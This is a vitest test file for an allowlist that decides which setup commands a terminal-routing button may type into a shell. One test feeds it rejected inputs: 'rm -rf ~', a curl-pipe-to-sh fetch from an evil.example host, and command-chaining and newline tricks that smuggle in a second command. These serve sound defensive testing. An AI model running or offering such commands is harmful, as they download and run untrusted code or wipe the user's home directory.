import { describe, expect, it } from 'vitest'
import { keyLineFor, setupLineAllowed } from '../src/shared/route-lines'
import { typedBytes } from '../src/renderer/src/routing/use-setup-terminal'
import { routeFixture } from '../src/shared/route-fixture'

/**
 * THE LINES A ROUTING BUTTON MAY TYPE INTO A SHELL.
 *
 * A RouteState travels over the companion API and the relay; the renderer
 * types only shapes it knows, whoever handed it the string. A key line ends
 * in a space and gets no Enter — the user pastes the key.
 */
describe('the allowlist', () => {
  it('admits every line main produces', () => {
    const state = routeFixture('online')
    for (const line of [state.setup.installLine, state.setup.serveLine, state.setup.pluginLine, state.setup.addSubscriptionLine, state.setup.addLocalLine, state.setup.addGroupLine]) {
      expect(setupLineAllowed(line), line).toBe(true)
    }
    for (const row of state.harnesses) {
      expect(setupLineAllowed(row.installLine), row.installLine).toBe(true)
      if (row.loginLine) expect(setupLineAllowed(row.loginLine), row.loginLine).toBe(true)
    }
    expect(setupLineAllowed('magpie provider add deepseek ')).toBe(true)
    expect(setupLineAllowed('magpie serve')).toBe(true)
    expect(setupLineAllowed('brew install sst/tap/opencode')).toBe(true)
  })

  it('refuses anything else — a shaped /api/route must not become shell', () => {
    for (const line of ['rm -rf ~', 'magpie provider add deepseek sk-123', 'curl -fsSL https://evil.example/install.sh | sh', 'npm i -g @anthropic-ai/claude-code; rm -rf ~', 'claude login\nrm -rf ~', 'magpie plugin add a b', '', 'x'.repeat(401)]) {
      expect(setupLineAllowed(line), line).toBe(false)
    }
  })
})

describe('what the PTY receives', () => {
  it('gets Enter only when asked', () => {
    expect(typedBytes('magpie serve', true)).toBe('magpie serve\r')
    expect(typedBytes('magpie provider add deepseek ', false)).toBe('magpie provider add deepseek ')
  })

  it('builds a key line only from the bare stem', () => {
    expect(keyLineFor('magpie provider add ', 'deepseek')).toBe('magpie provider add deepseek ')
    expect(keyLineFor('magpie provider add <preset> ', 'deepseek')).toBeNull()
    expect(keyLineFor('magpie provider add', 'deepseek')).toBeNull()
  })
})
